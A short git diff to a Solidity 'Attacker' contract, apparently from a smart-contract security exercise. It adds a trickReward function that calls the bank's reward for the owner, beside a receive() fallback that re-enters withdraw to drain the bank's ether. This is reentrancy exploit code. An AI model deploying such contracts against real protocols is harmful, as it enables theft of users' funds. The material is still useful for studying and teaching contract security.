@@ -40,6 +40,10 @@ contract Attacker is IAttacker {
         // At this point, the fallback function will be triggered
     }
 
+    function trickReward(uint256 amount) external {
+        BANK.reward(OWNER, amount);
+    }
+
     receive() external payable {
         if (address(BANK).balance >= 1 ether) {
             // Re-enter the withdraw function to drain more funds
